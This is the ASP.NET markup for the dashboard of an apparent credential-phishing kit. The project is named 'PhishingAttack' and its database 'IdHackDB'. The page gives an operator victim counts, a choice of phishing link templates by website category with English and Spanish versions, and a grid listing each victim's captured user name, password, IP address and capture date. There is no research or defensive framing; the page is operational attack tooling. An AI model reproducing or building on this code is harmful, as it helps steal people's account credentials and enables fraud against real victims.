<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Default.aspx.cs" Inherits="PhishingAttack.Default1" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title> setphishing </title>
    <link rel="icon" href="images/pngegg.png" type="images/gif" sizes="16*16" />
    <style type="text/css">
        
        body
        {
            background-color: rgba(233,232,232,0.89);
            }
            

        .style1
        {
           padding-left: 0px;
           margin-left: auto;
           margin-top: auto;
           margin-right: auto;
           margin-bottom: auto;
	}	
        
        .style2
        {
          padding-left: 0px;
          margin-left: auto;
	      margin-top : auto;
	      margin-right : auto;
          margin-bottom : auto;
        }
     
     body div
     {
         background-color: rgba(233,232,232,0.89);
	margin-top: -8px;
	margin-right: -8px;
	margin-left: -8px;
	margin-bottom: -8px;
	-webkit-box-shadow: 0px 0px 0px;
	box-shadow: 0px 20px 50px;
         }   
    .imgclass
    { 
        width: 40px;
	height: 38px;
	margin-left: 8px;
    }
        .style3
        {
            height: 23px;

        }
        .style4
        {
            width: 81px;
        }
        #logoutbtn
        {
            
	border: thin solid rgba(184,184,184,0.43);
    text-indent: 8px;
    color: rgba(255,255,255,1.00);
	border-radius: 3px/3px;
	font-weight: bold;
            }
        .style5
        {
            width: 81px;
            height: 23px;
        }
    </style>
</head>
<body>
    <form id="form1" runat="server">



    
      <table class="style1">
        <tr>
            <td>
                
                <asp:Label ID="lblPhishing" runat="server" Text="Social Engineering Toolkit" 
                    Font-Names="Magneto" Font-Bold="True" Font-Italic="False" Font-Size="80px" 
                    ForeColor="#0066FF"></asp:Label>
                
                </td>
        </tr>
        <tr>
            <td>
                &nbsp
            </td>
        </tr>
 
    </table>

    <div>
      <table class="style2">
          <tr>
              <td style="text-align:right; text-decoration: none;" class="style3" >
                  <asp:LinkButton ID="lbtnHome" runat="server" Font-Underline="False" 
                      Font-Bold="True" Font-Names="magneto" Font-Size="Larger" 
                      ForeColor="#3399FF" onclick="lbtnHome_Click">Home</asp:LinkButton>
                 </td>
              <td style="text-align:left; padding-left: 10px">
                  <asp:LinkButton ID="lbtnMyVictims" runat="server" Font-Underline="False" 
                      Font-Bold="True" Font-Names="magneto" Font-Size="Larger" 
                      ForeColor="#3399FF" onclick="lbtnMyVictims_Click1">MyVictims</asp:LinkButton>
                 </td>
          </tr>
      </table>
      </div>

    <asp:Panel ID="Panel1" runat="server" style="margin-top:10px;" Visible="true" 
          Height="350px" Width="230px">

    <table style="border-style: none; border-color: inherit; border-width: medium; width: 222px;">
  
        <tr>
            <td align="center" colspan="2" class="style3">
                <asp:Label ID="Label1" runat="server" Text=" Account Info!! " 
                    Font-Names="Rockwell" Font-Size="25px" ForeColor="#3366CC" 
                    Font-Bold="True"></asp:Label>
            </td>
            
        </tr>
        
        <tr>
            <td align="center" colspan="2" id="img" style="padding-top:40px">
                <img src="../images/facebook.jpg" width="220" height="200" alt="" class="imgclass"/>   
            </td>
        </tr>
        <tr>
        <td style="text-align:center" class="style3">
            <asp:Label ID="Label2" runat="server" Text="Label"> User Name:</asp:Label>
        </td>
            <td class="style5">
                <asp:TextBox ID="TextBox1" runat="server" Height="19px" 
                    style="margin-bottom: 0px" Width="81px" Enabled="False"></asp:TextBox>
            </td>
        
        </tr>
         <tr>
        <td style="text-align:center">
            <asp:Label ID="Label3" runat="server" Text="Label"> Total Victims:</asp:Label>
        </td>
            <td class="style4">
                <asp:TextBox ID="TextBox2" runat="server" Height="19px" 
                    style="margin-bottom: 0px" Width="81px" Enabled="False"></asp:TextBox>
            </td>
        
        </tr>
         <tr>
        <td style="text-align:center">
            <asp:Label ID="Label4" runat="server" Text="Label"> Victims of Today:</asp:Label>
        </td>
            <td class="style4">
                <asp:LinkButton ID="LinkButton1" runat="server" Font-Underline="False" 
                    Font-Bold="False" Font-Names="Modern No. 20" ForeColor="#0066FF" 
                    onclick="LinkButton1_Click">Click Here:</asp:LinkButton>
            </td>
        
        </tr>
         <tr>
        <td style="text-align:center">
            <asp:Label ID="Label5" runat="server" Text="Label"> Country:</asp:Label>
        </td>
            <td class="style4">
                <asp:TextBox ID="TextBox4" runat="server" Height="19px" 
                    style="margin-bottom: 0px" Width="81px" Enabled="False"></asp:TextBox>
            </td>
        
        </tr>
                <tr>
            <td align="center" colspan="2" id="Td1" style="padding-top:20px">
                <asp:Button ID="logoutbtn" runat="server" Text="Log Out" BackColor="#0066FF" 
                    ForeColor="White" onclick="logoutbtn_Click" Width="80px"/>
            </td>
        </tr>
    </table>
    </asp:Panel>



    <asp:Panel ID="Panel2" runat="server" Width="1117px" 
          style="margin-left: 240px; margin-top:-350px" Height="500px">

   <table width="200px" style="border">
   <tr>
    <td style="padding-left: 10px">
        <asp:Label ID="Label6" runat="server" Text="Scamas!" Font-Names="Rockwell" Font-Size="25px" ForeColor="#3366CC" 
                    Font-Bold="True"></asp:Label>
    </td>
    
       
   </tr>
       
   <tr>
    <td style="padding-left: 10px;">

        
        
        <asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False" 
            CellPadding="4" DataSourceID="SqlDataSource1" ForeColor="#3333CC" 
            GridLines="None" Width="1110px" style="margin-top:10px" Visible="False" 
            HorizontalAlign="Center" Font-Bold="True" Font-Names="Tahoma" 
            Font-Size="Small">

            <AlternatingRowStyle BackColor="White" />
            <Columns>
                <asp:TemplateField HeaderText="Serial No.">
                

                    <ItemTemplate>
                        <%# Container.DataItemIndex + 1 %>
                    </ItemTemplate>
                    <ItemStyle HorizontalAlign="Center" />
                </asp:TemplateField>
                <asp:BoundField DataField="LinkCategory" HeaderText="Website Category" 
                    SortExpression="LinkCategory" >
                <ItemStyle HorizontalAlign="Center" />
                </asp:BoundField>
                <asp:ImageField DataImageUrlField="ImageLink" HeaderText="Website Logo">
                    <ControlStyle Height="100px" Width="300px"/>
                    <ItemStyle HorizontalAlign="Center" />
                </asp:ImageField>
               
                <asp:TemplateField HeaderText="Get Link">
                    <ItemTemplate>
                        <asp:RadioButton ID="RadioButton1" runat="server" AutoPostBack="True" 
                            GroupName="g1" oncheckedchanged="RadioButton1_CheckedChanged" Text="English" />
                        &nbsp;&nbsp;&nbsp;
                        <asp:RadioButton ID="RadioButton2" runat="server" AutoPostBack="True" 
                            GroupName="g1" oncheckedchanged="RadioButton2_CheckedChanged" Text="Spanish" />
                    </ItemTemplate>
                    <ItemStyle HorizontalAlign="Center" />
                </asp:TemplateField>
            </Columns>
            <EditRowStyle BackColor="#7C6F57" />
            <FooterStyle BackColor="#EBEAEA" Font-Bold="True" ForeColor="White" />
            <HeaderStyle BackColor="#1C5E55" Font-Bold="True" ForeColor="White" />
            <PagerStyle BackColor="#666666" ForeColor="White" HorizontalAlign="Center" />
            <RowStyle BackColor="#E3EAEB" />
            <SelectedRowStyle BackColor="#C5BBAF" Font-Bold="True" ForeColor="#333333" />
            <SortedAscendingCellStyle BackColor="#F8FAFA" />
            <SortedAscendingHeaderStyle BackColor="#246B61" />
            <SortedDescendingCellStyle BackColor="#D4DFE1" />
            <SortedDescendingHeaderStyle BackColor="#15524A" />

        </asp:GridView>

         <asp:SqlDataSource ID="SqlDataSource1" runat="server" 
            ConnectionString="<%$ ConnectionStrings:IdHackDBConnectionString5 %>" 
            SelectCommand="SELECT [LinkName], [LinkCategory], [ImageLink] FROM [AddLink]">
        </asp:SqlDataSource>

   
    </td>
   </tr>
   
   <tr>
    <td style="padding-left: 10px;">
        <asp:GridView ID="GridView2" runat="server" AutoGenerateColumns="False" 
            CellPadding="4" ForeColor="#3333CC" GridLines="None" Width="1110px" 
            style="margin-top:10px" Visible="False" 
            HorizontalAlign="Center" Font-Bold="True">

            <AlternatingRowStyle BackColor="White" />
            <Columns>
             <asp:TemplateField HeaderText="Serial No.">
                

                    <ItemTemplate>
                        <%# Container.DataItemIndex + 1 %>
                    </ItemTemplate>
                    <ItemStyle HorizontalAlign="Center" />
                </asp:TemplateField>

                <asp:BoundField DataField="Category" HeaderText="Category">
                <ItemStyle HorizontalAlign="Center" />
                </asp:BoundField>
                <asp:BoundField DataField="VictimUserName" HeaderText="Victim User Name">
                <ItemStyle HorizontalAlign="Center" />
                </asp:BoundField>
                <asp:BoundField DataField="Password" HeaderText="Password">
                <ItemStyle HorizontalAlign="Center" />
                </asp:BoundField>
                <asp:BoundField DataField="IPAddress" HeaderText="IPAddress">
                <ItemStyle HorizontalAlign="Center" />
                </asp:BoundField>
                <asp:BoundField DataField="Date" HeaderText="Date">
                <ItemStyle HorizontalAlign="Center" />
                </asp:BoundField>
            </Columns>
            <EditRowStyle BackColor="#7C6F57" />
            <FooterStyle BackColor="#1C5E55" Font-Bold="True" ForeColor="White" />
            <HeaderStyle BackColor="#1C5E55" Font-Bold="True" ForeColor="White" />
            <PagerStyle BackColor="#666666" ForeColor="White" HorizontalAlign="Center" />
            <RowStyle BackColor="#E3EAEB" />
            <SelectedRowStyle BackColor="#C5BBAF" Font-Bold="True" ForeColor="#333333" />
            <SortedAscendingCellStyle BackColor="#F8FAFA" />
            <SortedAscendingHeaderStyle BackColor="#246B61" />
            <SortedDescendingCellStyle BackColor="#D4DFE1" />
            <SortedDescendingHeaderStyle BackColor="#15524A" />

        </asp:GridView>
    </td>
   </tr>
  
   </table>

    </asp:Panel>


    

   
    </form>
  
</body>
</html>
